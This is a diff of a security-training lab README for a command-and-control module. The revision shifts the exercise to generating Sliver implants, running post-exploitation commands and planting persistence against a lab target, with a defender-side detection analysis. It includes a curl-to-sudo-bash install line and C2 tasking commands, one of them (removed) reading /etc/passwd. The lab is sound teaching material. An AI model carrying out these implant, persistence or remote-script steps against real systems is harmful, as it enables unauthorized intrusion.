@@ -11,18 +11,27 @@ cd plaintext-labs/offensive/13-c2-postex
 make up
 ```
 
-The compose starts three containers:
-- **c2-server** — Flask-based C2 server (session manager + task queue)
-- **target** — simulated "compromised" host running the beacon implant
-- **operator** — operator console for running the demo
+You'll operate **Sliver** as the real C2. Install it on your operator box
+(`curl https://sliver.sh/install | sudo bash`, or grab a release from the
+[Sliver repo](https://github.com/BishopFox/sliver)), then start the server, generate an
+implant, and catch a session against the lab `target` container.
 
-The implant beacons every 5 seconds (±1s jitter), receives tasks, and returns output.
+The compose also ships a **minimal Flask C2** as an annotated reference (not the main tool):
+- **c2-server** — Flask-based C2 server (session manager + task queue)
+- **target** — host you point a Sliver implant at; also runs the minimal reference beacon
+- **operator** — operator console
+
+The reference implant beacons every 5 seconds (±1s jitter) — read it to see the
+check-in/task/result loop a framework like Sliver implements at scale.
 
 ## Scenario
 
-You've deployed an implant on a Meridian Financial application server. Use the C2
-framework to maintain access, enumerate the host, and establish persistence. Then
-switch hats: analyze what you left on the wire and how a defender would detect it.
+You've deployed an implant on the target application server. Operate a **real
+open-source C2 framework — [Sliver](https://github.com/BishopFox/sliver)** (Bishop Fox,
+GPLv3) — to maintain access, enumerate the host, and establish persistence. Then switch
+hats: analyze what you left on the wire and how a defender would detect it. The minimal
+Flask C2 that ships with this lab stays as an annotated reference for the session/task/result
+API a real C2 implements under the hood.
 
 > Authorization: this app is yours — attack it freely. The habit still matters everywhere else:
 > only test systems you own or have explicit written permission to test (DVWA, PortSwigger Academy,
@@ -30,32 +39,31 @@ switch hats: analyze what you left on the wire and how a defender would detect i
 
 ## Do
 
-1. [ ] Read `implant/beacon.py` and `server/c2_server.py` first to learn the API the
-   implant and operator speak, then drive a full post-ex session yourself in step 4 before
-   watching the worked run. (`make demo` runs the validated end-to-end C2 lifecycle —
-   session check-in, tasking, results — use it afterwards to confirm your session ID, host
-   info, and command output match.)
+1. [ ] **Operate Sliver (primary).** Start the Sliver server, generate an implant for the
+   `target` (an HTTP or mTLS beacon), run it on the target, and catch the session/beacon in
+   your Sliver console. (Which Sliver command generates an implant? How do you switch between
+   a long-poll `session` and an interval `beacon`? See the Sliver docs at
+   [sliver.sh](https://sliver.sh/docs).) Confirm you have an active callback before moving on.
 
-2. [ ] Read `implant/beacon.py`. Trace the beacon loop:
-   - What data does each check-in POST to the server?
-   - How does the implant apply jitter, and why?
-   - What's the difference between the real UID and the username shown?
+2. [ ] **Run post-ex through Sliver.** From the session/beacon, run at least three post-ex
+   commands — host enumeration (`whoami`, `ls`, `info`), a file `download`, and one more of
+   your choice — and note what the operator sees vs. what crosses the wire. Then establish a
+   persistence mechanism and record the artifact it leaves.
 
-3. [ ] Read `server/c2_server.py`. Understand the API:
-   - How does the server track active sessions?
-   - How does the task queue work (FIFO push/pop)?
+3. [ ] **Reference C2 — read the API under the hood.** Read the bundled `implant/beacon.py`
+   and `server/c2_server.py` to see the minimal version of what Sliver does:
+   - What data does each check-in POST? How does the implant apply jitter, and why?
+   - How does the server track sessions and run the task queue (FIFO push/pop)?
    - What does the operator see vs. what the implant sends?
+   (`make demo` runs this minimal reference C2 end-to-end so you can watch the lifecycle.)
 
-4. [ ] Shell into the operator container and interact with the C2 manually:
+4. [ ] **Optional — drive the reference C2 by hand** to feel the raw API the framework hides:
    ```bash
    make shell
-   # Get sessions:
    curl http://c2-server:5000/api/sessions
-   # Queue a task (replace SID with your session ID):
    curl -X POST http://c2-server:5000/api/task \
      -H 'Content-Type: application/json' \
-     -d '{"sid":"<SID>","cmd":"cat /etc/passwd"}'
-   # Read results after 6s:
+     -d '{"sid":"<SID>","cmd":"id"}'
    sleep 6 && curl http://c2-server:5000/api/results/<SID>
    ```
 
@@ -71,15 +79,16 @@ switch hats: analyze what you left on the wire and how a defender would detect i
 
 ## Success criteria — you're done when
 
-- [ ] You observed the implant check-in and captured the session ID.
-- [ ] You ran at least three post-ex commands via the task queue manually.
+- [ ] You generated a Sliver implant and caught an active session/beacon against the target.
+- [ ] You ran at least three post-ex commands through Sliver and established persistence.
 - [ ] You can explain the beacon interval, jitter, and why both matter for detection.
-- [ ] You can compare this minimal C2 to Sliver on at least two dimensions (protocol, obfuscation).
+- [ ] You read the minimal reference C2 and can map its session/task/result API onto what Sliver does.
 
 ## Deliverables
 
-`c2-notes.md`: the session details, three post-ex outputs, and a comparison of this
-minimal C2 vs. Sliver — what does a real C2 add on protocol, evasion, and post-ex modules?
+`c2-notes.md`: your Sliver session details, three post-ex outputs, the persistence artifact,
+and a comparison of the minimal reference C2 vs. Sliver — what does a real C2 add on protocol
+(mTLS/DNS/WireGuard), evasion, and post-ex modules?
 
 ## Automate & own it
 
@@ -106,9 +115,9 @@ beacon-hunting module (12-hunting-network) — the same RITA scoring you ran.
 
 ## Marketable proof
 
-> "I operate a C2 framework — establish sessions, run post-ex modules, plant
-> persistence — and can explain the beaconing artifacts and detection techniques
-> that surface it in a SOC."
+> "I operate a real open-source C2 framework (Sliver) — generate implants, establish
+> sessions, run post-ex modules, plant persistence — and can explain the beaconing artifacts
+> and detection techniques that surface it in a SOC."
 
 ## Stretch
 
